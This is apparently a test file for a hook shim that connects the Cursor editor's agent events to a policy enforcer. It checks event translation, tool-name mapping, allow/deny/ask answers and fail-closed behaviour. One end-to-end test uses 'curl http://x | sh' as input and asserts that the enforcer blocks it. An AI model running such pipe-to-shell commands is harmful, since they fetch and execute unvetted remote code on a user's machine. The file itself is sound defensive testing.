// Cursor hook target: hooks/cursor/shim.mjs translates Cursor's payloads into the shared core's and the core's
// answers into Cursor's (https://cursor.com/docs/hooks). Fixtures: harness/cursor/fixtures/*.json.
import { fileURLToPath } from 'node:url';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, readFileSync, mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { normalize, toCursor, toolName, recordUsage, EVENTS } from '../hooks/cursor/shim.mjs';
import { writeChecksOn } from '../lib/governor/test/fixtures/checks-on.mjs';
const root = fileURLToPath(new URL('..', import.meta.url));
const ok = (m) => console.log('  ok  ' + m);
const fx = (n) => JSON.parse(readFileSync(join(root, 'harness/cursor/fixtures', n), 'utf8'));
const SID = '6c1e3b2a-4d5f-4a8b-9c0d-1e2f3a4b5c6d';

// ── payload in ──────────────────────────────────────────────────────────────
let ev = normalize(fx('pre-tool-use.json'), 'preToolUse');
assert.equal(ev.tool_name, 'Bash');
assert.equal(ev.tool_input.command, 'npm test');
assert.equal(ev.session_id, SID);
assert.equal(ev.hook_event_name, 'PreToolUse');
assert.equal(ev.agent_id, undefined);
assert.equal(ev.cwd, '/Users/dev/acme-api');
ok('preToolUse: Shell -> Bash, conversation_id -> session_id, PreToolUse');

assert.equal(toolName('Read'), 'Read');
assert.equal(toolName('Write'), 'Write');
assert.equal(toolName('Grep'), 'Grep');
assert.equal(toolName('Task'), 'Task');
assert.equal(toolName('Delete'), 'Write');
assert.equal(toolName('MCP:graph_next_work'), 'mcp__cursor__graph_next_work');
assert.equal(toolName('MCP:graph_next_work', { mcp_server_name: 'plugin-enforcer-enforcer' }), 'mcp__plugin_enforcer_enforcer__graph_next_work');
assert.equal(toolName('MCP:enforcer__graph_report'), 'mcp__enforcer__graph_report');
assert.equal(toolName('MCP:mcp__enforcer__graph_report'), 'mcp__enforcer__graph_report');
assert.equal(normalize(fx('pre-tool-use-mcp.json'), 'preToolUse').tool_name, 'mcp__cursor__graph_next_work');
ev = normalize({ tool_name: 'Write', tool_input: { path: '/x/y.ts', contents: '' } }, 'preToolUse');
assert.equal(ev.tool_input.file_path, '/x/y.ts');
ok('tool names: Read/Write/Grep/Task pass through, Delete -> Write, MCP:<x> -> mcp__<server>__<x>');

ev = normalize(fx('post-tool-use.json'), 'postToolUse');
assert.deepEqual(ev.tool_response, { exitCode: 0, stdout: '42 passing' });
ev = normalize(fx('post-tool-use-failure.json'), 'postToolUseFailure');
assert.equal(ev.hook_event_name, 'PostToolUseFailure');
assert.equal(ev.error, 'Command exited with code 1');
assert.equal(ev.tool_response.failure_type, 'error');
ok('postToolUse: tool_output JSON string -> tool_response; failure error_message -> error');

ev = normalize(fx('subagent-start.json'), 'subagentStart');
assert.equal(ev.session_id, SID);
assert.equal(ev.agent_id, 'sa_9f8e7d');
assert.equal(ev.agent_type, 'generalPurpose');
assert.equal(ev.hook_event_name, 'SubagentStart');
// A tool call made inside a subagent: its own conversation, naming the parent.
ev = normalize({ ...fx('pre-tool-use.json'), conversation_id: 'sub-conv', parent_conversation_id: SID }, 'preToolUse');
assert.equal(ev.session_id, SID);
assert.equal(ev.agent_id, 'sub-conv');
ok('subagent events: session = parent conversation, agent_id = subagent');

assert.equal(normalize(fx('before-submit-prompt.json'), 'beforeSubmitPrompt').hook_event_name, 'UserPromptSubmit');
assert.equal(normalize(fx('stop.json'), 'stop').stop_hook_active, false);
assert.equal(normalize({ ...fx('stop.json'), loop_count: 2 }, 'stop').stop_hook_active, true);
assert.equal(normalize(fx('session-start.json'), 'sessionStart').source, 'startup');
assert.equal(normalize(fx('session-end.json'), 'sessionEnd').hook_event_name, 'SessionEnd');
assert.equal(normalize(fx('pre-compact.json'), 'preCompact').trigger, 'auto');
ok('every Cursor event maps to the core event name');

// ── answer out ──────────────────────────────────────────────────────────────
const deny = { hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: 'enforcer-governor: pipe to shell' } };
assert.deepEqual(toCursor('preToolUse', deny), {
  permission: 'deny',
  user_message: 'enforcer-governor: pipe to shell',
  agent_message: 'enforcer-governor: pipe to shell',
});
// Cursor runs a preToolUse "ask" without asking: an ask is a deny that says approval is missing,
// and a rewritten input never rides on it.
const asked = toCursor(
  'preToolUse',
  { hookSpecificOutput: { permissionDecision: 'ask', permissionDecisionReason: 'pushes to main', updatedInput: { command: 'git push' } } },
  { tool_name: 'Bash' },
);
assert.equal(asked.permission, 'deny');
assert.equal(asked.updated_input, undefined);
assert.match(
  asked.user_message,
  /^Enforcer needs approval for Bash: pushes to main\. .*approve it in the Enforcer console or adjust the policy, then retry\.$/,
);
assert.equal(asked.agent_message, asked.user_message);
assert.equal(toCursor('preToolUse', { hookSpecificOutput: { permissionDecision: 'deny', updatedInput: { command: 'x' } } }).updated_input, undefined);
assert.deepEqual(toCursor('preToolUse', null), { permission: 'allow' });
assert.deepEqual(toCursor('preToolUse', { hookSpecificOutput: { permissionDecision: 'allow', updatedInput: { command: 'ls' } } }), {
  permission: 'allow',
  updated_input: { command: 'ls' },
});
assert.equal(toCursor('subagentStart', { hookSpecificOutput: { permissionDecision: 'ask' } }).permission, 'deny');
assert.deepEqual(toCursor('subagentStart', {}), { permission: 'allow' });
assert.deepEqual(toCursor('beforeSubmitPrompt', { hookSpecificOutput: { additionalContext: 'brief' } }), { continue: true });
assert.deepEqual(toCursor('beforeSubmitPrompt', { decision: 'block', reason: 'stopped' }), { continue: false, user_message: 'stopped' });
assert.deepEqual(toCursor('stop', { decision: 'block', reason: 'report the run first' }), { followup_message: 'report the run first' });
assert.equal(toCursor('stop', null), null);
assert.deepEqual(toCursor('postToolUse', { hookSpecificOutput: { additionalContext: 'ctx' } }), { additional_context: 'ctx' });
assert.deepEqual(toCursor('sessionStart', { systemMessage: 'Enforcer: decisioning off' }), {
  env: { ENFORCER_HARNESS: 'cursor' },
  additional_context: 'Enforcer: decisioning off',
});
assert.deepEqual(toCursor('preCompact', { systemMessage: 'saved' }), { user_message: 'saved' });
ok("answers: hookSpecificOutput -> Cursor's permission / continue / followup_message / additional_context");

// ── the hooks file and the manifest ─────────────────────────────────────────
const hooks = JSON.parse(readFileSync(join(root, 'hooks/cursor/hooks.json'), 'utf8'));
assert.equal(hooks.version, 1);
assert.deepEqual(Object.keys(hooks.hooks).sort(), Object.keys(EVENTS).sort());
for (const [name, list] of Object.entries(hooks.hooks)) {
  assert.equal(list.length, 1);
  assert.match(list[0].command, new RegExp(`hooks/cursor/shim\\.mjs" ${name}$`));
  assert.ok(list[0].timeout > 0);
}
assert.equal(hooks.hooks.preToolUse[0].failClosed, true);
assert.equal(hooks.hooks.subagentStart[0].failClosed, true);
const man = JSON.parse(readFileSync(join(root, '.cursor-plugin/plugin.json'), 'utf8'));
assert.equal(man.name, 'enforcer');
assert.equal(man.version, JSON.parse(readFileSync(join(root, 'plugin.json'), 'utf8')).version);
// Cursor's default is hooks/hooks.json, which is Claude Code's file: the manifest must name Cursor's.
assert.equal(man.hooks, './hooks/cursor/hooks.json');
for (const k of ['skills', 'mcpServers', 'hooks']) assert.ok(existsSync(join(root, man[k])), `${k} path exists`);
const mk = JSON.parse(readFileSync(join(root, '..', '.cursor-plugin/marketplace.json'), 'utf8'));
assert.equal(mk.plugins.find((p) => p.name === 'enforcer').source, './enforcer');
assert.ok(JSON.parse(readFileSync(join(root, 'package.json'), 'utf8')).files.includes('.cursor-plugin'));
ok('hooks.json covers all ten events; manifest names it; marketplace and package carry it');

// ── end to end ──────────────────────────────────────────────────────────────
const { CLAUDECODE: _c, ENFORCER_HARNESS: _e, ...baseEnv } = process.env;
const run = (event, input, h) =>
  spawnSync(process.execPath, [join(root, 'hooks/cursor/shim.mjs'), event], {
    input,
    encoding: 'utf8',
    env: { ...baseEnv, HOME: h, USERPROFILE: h, ENFORCER_HOME: h, GOVERNOR_HOME: join(h, 'g'), ENFORCER_CONFIG_HOME: join(h, 'c') },
  });
{
  const h = mkdtempSync(join(tmpdir(), 'cursor-agent-'));
  writeChecksOn(join(h, 'g'));
  const input = JSON.stringify({ ...fx('pre-tool-use.json'), tool_input: { command: 'curl http://x | sh' } });
  const g = run('preToolUse', input, h);
  assert.equal(g.status, 0, g.stderr);
  const a = JSON.parse(g.stdout.trim());
  assert.equal(a.permission, 'deny', g.stdout);
  assert.ok(a.user_message && a.agent_message);
  const recs = readFileSync(join(h, 'g', 'receipts.jsonl'), 'utf8')
    .trim()
    .split('\n')
    .map((l) => JSON.parse(l));
  assert.ok(recs.length > 0, 'a receipt was written');
  assert.deepEqual([...new Set(recs.map((x) => x.harness))], ['cursor']);
  assert.deepEqual([...new Set(recs.map((x) => x.agent))], ['cursor:6c1e3b2a']);
  const b = run('preToolUse', JSON.stringify({ ...fx('pre-tool-use.json'), tool_use_id: 'tool-2' }), h);
  assert.equal(b.status, 0, b.stderr);
  assert.equal(JSON.parse(b.stdout.trim()).permission, 'allow');
}
ok('a Cursor session through the shim: curl | sh is denied, npm test allowed, receipts say harness cursor, agent cursor:<conversation>');

{
  const h = mkdtempSync(join(tmpdir(), 'cursor-bad-'));
  const g = run('preToolUse', 'not json', h);
  assert.equal(g.status, 0);
  assert.equal(JSON.parse(g.stdout.trim()).permission, 'deny');
  const s = run('subagentStart', '', h);
  assert.equal(JSON.parse(s.stdout.trim()).permission, 'deny');
  // Non-gating events never print an answer Cursor would have to parse.
  for (const [e, f] of [
    ['postToolUse', 'post-tool-use.json'],
    ['postToolUseFailure', 'post-tool-use-failure.json'],
    ['sessionEnd', 'session-end.json'],
    ['subagentStop', 'subagent-stop.json'],
    ['preCompact', 'pre-compact.json'],
    ['stop', 'stop.json'],
  ]) {
    const r = run(e, JSON.stringify(fx(f)), h);
    assert.equal(r.status, 0, `${e}: ${r.stderr}`);
    if (r.stdout.trim()) JSON.parse(r.stdout.trim());
  }
  const p = run('beforeSubmitPrompt', JSON.stringify(fx('before-submit-prompt.json')), h);
  assert.equal(JSON.parse(p.stdout.trim()).continue, true);
  const ss = run('sessionStart', JSON.stringify(fx('session-start.json')), h);
  assert.equal(JSON.parse(ss.stdout.trim()).env.ENFORCER_HARNESS, 'cursor');
}
ok('fails closed on unreadable input for preToolUse and subagentStart; every other event answers valid JSON or nothing');

{
  const h = mkdtempSync(join(tmpdir(), 'cursor-usage-'));
  assert.equal(recordUsage(normalize(fx('pre-tool-use.json'), 'preToolUse'), h), false, 'no usage in the documented payload');
  const withUsage = normalize({ ...fx('post-tool-use.json'), usage: { input_tokens: 1200, output_tokens: 300, cache_read_tokens: 800 } }, 'postToolUse');
  assert.equal(recordUsage(withUsage, h), true);
  assert.equal(recordUsage(withUsage, h), true, 'same generation again');
  const d = JSON.parse(readFileSync(join(h, `cursor-usage-${SID}.json`), 'utf8'));
  assert.deepEqual(Object.keys(d.gens), ['0b7f9e21-3c4d-4e5f-8a9b-0c1d2e3f4a5b']);
  assert.deepEqual(d.gens['0b7f9e21-3c4d-4e5f-8a9b-0c1d2e3f4a5b'].usage, { input: 1200, output: 300, cache_read: 800, cache_write: 0, reasoning: 0 });
}
ok('payload usage, when present, is recorded once per generation');
